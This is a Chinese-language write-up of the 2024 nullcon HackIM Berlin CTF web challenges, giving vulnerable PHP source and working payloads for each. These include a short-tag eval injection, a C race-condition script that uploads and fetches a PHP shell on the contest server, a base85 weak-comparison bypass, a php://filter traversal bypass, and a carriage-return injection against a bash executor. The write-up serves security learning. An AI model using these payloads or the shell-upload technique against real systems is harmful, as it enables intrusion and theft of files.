# 2024 nullcon_HackIM_CTF_Berlin


nullcon跟柏林工大联合搞的CTF比赛，web题目全部考察php

<!--more-->

![img](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/HackIM-03.png?imageSlim)

nullcon HackIM 2024 is a web-based Jeopardy CTF. You do not need a dedicated server or a VPN environment in order to participate.

The CTF starts at 09:30 UTC on March 14th and ends at 11:00 UTC on March 15th.

## web

### [faleval]

```php
<?php
ini_set("error_reporting", 0);
ini_set("short_open_tag", "Off");

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$input = $_GET['input'];

if(preg_match('/[^\x21-\x7e]/', $input)) {
    die("Illegal characters detected!");
}

$filter = array("<?php", "<? ", "?>", "echo", "var_dump", "var_export", "print_r", "FLAG");
$filter = array("<?php", "<? ", "?>","*", "/", "var_dump", "var_export", "print_r", "FLAG");
foreach($filter as &$keyword) {
    if(str_contains($input, $keyword)) {
        die("PHP code detected!\n");
    }
}

eval("?>" . $input);

echo "\n";

?>
```

过滤了php标签头`<?php`，可以用短标签`<?=`

payload:

```
?source&input=<?=phpinfo();
?source&input=<?=show_source('flag.php');
```

![image-20240408110125019](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240408110125019.png?imageSlim)

### [The Fast Falafel Shop]

文件上传

根据题目描述，结合给的源码，可判断为条件竞争

![image-20240408111042357](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240408111042357.png?imageSlim)

![image-20240408111003587](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240408111003587.png?imageSlim)

刚开始没打通，我以为是本国网速延迟导致.....然鹅是能通的.....

Minei3oat师傅写的c语言脚本

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

const char POST[] = "POST /contest.php HTTP/1.1\r\nHost: 52.59.124.14:5010\r\nContent-Type: multipart/form-data; boundary=---------------------------2293933683385722748470522066\r\nContent-Length: 413\r\n\r\n-----------------------------2293933683385722748470522066\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"ctf0_shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php\r\necho file_get_contents('/var/www/html/flag.txt');\r\n?>\r\n\r\n-----------------------------2293933683385722748470522066\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSubmit!\r\n-----------------------------2293933683385722748470522066--\r\n\r\n";
const char GET[] = "GET /uploads/ctf0_shell.php HTTP/1.1\r\nHost: 52.59.124.14:5010\r\n\r\n";

int main() {
    // get sockets
    int post_socket = socket(AF_INET, SOCK_STREAM, 0);
    int get_socket = socket(AF_INET, SOCK_STREAM, 0);

    // connect them to the server
    struct sockaddr_in server;
    unsigned long addr;
    memset( &server, 0, sizeof (server));
    addr = inet_addr( "52.59.124.14" );
    memcpy( (char *)&server.sin_addr, &addr, sizeof(addr));
    server.sin_family = AF_INET;
    server.sin_port = htons(5010);

    connect(post_socket,(struct sockaddr*)&server, sizeof(server));
    connect(get_socket,(struct sockaddr*)&server, sizeof(server));

    // send requests
    send(post_socket, POST, sizeof(POST), 0);
    send(get_socket, GET, sizeof(GET), 0);

    // read answer
    char answer[1024];
    memset( &answer, 0, sizeof (answer));
    read(post_socket, answer, 1024);
    puts(answer);
    memset( &answer, 0, sizeof (answer));
    read(get_socket, answer, 1024);
    puts(answer);

    // close connection
    close(get_socket);
    close(post_socket);
}
```

程序在Linux环境汇总编译执行
![image-20240408113243605](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240408113243605.png?imageSlim)

### [bassy]

```php
<?php
ini_set("error_reporting", 1);

include "flag.php";
include "./base85.class.php"; // https://github.com/scottchiefbaker/php-base85

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

if(isset($_GET['password'])) {
    $pw = base85::encode($_GET['password']);

    if($pw == base85::decode($ADMIN_PW)) {
        echo $FLAG;
    } 
}

?>
```

php弱比较

本题逻辑是，传入参数password的值经过base85编码后经过弱比较等同于$ADMIN_PWbase85解码后的值，根据题目描述，ADMIN_PW前几位是`0P)s`，解码后是`0e1`弱比较等同于0，经过测试，`1+`经过base85编码后是`0e3`弱比较等同于0

https://www.dcode.fr/ascii-85-encoding

payload

```
?source&password=1%2B
```

发包的时候需要对参数url编码

![image-20240408140127490](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240408140127490.png?imageSlim)

### [The Fast Falafel Shop 2]





### [Traversaller]

```php
<?php
ini_set("error_reporting", 0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "/var/www/html/flag.php";

function sanitize_path($p) {
        return str_replace(array("\0","\r","\n","\t","\x0B",'..','./','.\\','//','\\\\',),'',trim($p, "\x00..\x1F"));
}
$path = $_GET['path'];
if(isset($path) && str_contains($path, "/var/www/html/static/")) {
    die(file_get_contents(sanitize_path($path)));
}

?>
```

利用php为协议读取`/var/www/html/flag.php`，但要对题目对特殊的路径符号进行过滤的绕过

payload

```
?source&path=php:/\\\\/filter/read=/var/www/html/static/convert.base64-encode/resource=/var/www/html/flag.php
```

![image-20240408200424328](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240408200424328.png?imageSlim)

### [executy]

```php
<?php
ini_set("error_reporting", 0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}
include "flag.php";

# From: https://stackoverflow.com/questions/2040240/php-function-to-generate-v4-uuid/15875555#15875555
function format_uuidv4($data)
{
  assert(strlen($data) == 16);

  $data[6] = chr(ord($data[6]) & 0x0f | 0x40); // set version to 0100
  $data[8] = chr(ord($data[8]) & 0x3f | 0x80); // set bits 6-7 to 10
    
  return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}

$THE_SCRIPT = <<<SCRIPT
#!/bin/sh
cat flag.txt;
SCRIPT;


if(isset($_POST['executy'])) {
    $executy = trim($_POST['executy']);

    try {
        if(strlen($executy) > 1024) {
            throw new Exception("Too long");
        }

        if($executy == $THE_SCRIPT) {
            throw new Exception("Nope, this is too easy!");
        }

    $fname = "/tmp/" . format_uuidv4(random_bytes(16)) . ".sh";

    $ret = file_put_contents($fname, $executy);
        if(!$ret) {
            throw new Exception("Nope");
        }

        `ulimit -Sn 10000;ulimit -Hn 50000;screen -Dm -- bash -c "cat $fname; screen -X hardcopy -h $fname.out"`;
        $fcontent = trim(file_get_contents($fname . ".out"));

        if($fcontent != $THE_SCRIPT) {
            echo "I'm not allowed to execute other files :-(";
            throw new Exception("Nope");
        }

        echo `timeout 1s bash $fname 2>&1`;

    } catch(Exception $e) {
        echo "An error occured!" . $e;
    }
    @unlink($fname);
    @unlink($fname . ".out");
}
?>
```

输入的 bash 命令将被检查是否与$THE SCRIPT 变量中的内容匹配。如果不同，那么命令不会被执行。

根据下半部分源码可知，我们输入的 bash 命令并没有直接与 $THE_SCRIPT 变量进行比较。相反，它是使用硬拷贝屏幕捕获的。

可以发起 CLRF攻击

payload

```
%23%21%2Fbin%2Fsh%0Acat%20*%20#%0Dcat+flag.txt%3B
```

![image-20240408204007857](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240408204007857.png?imageSlim)
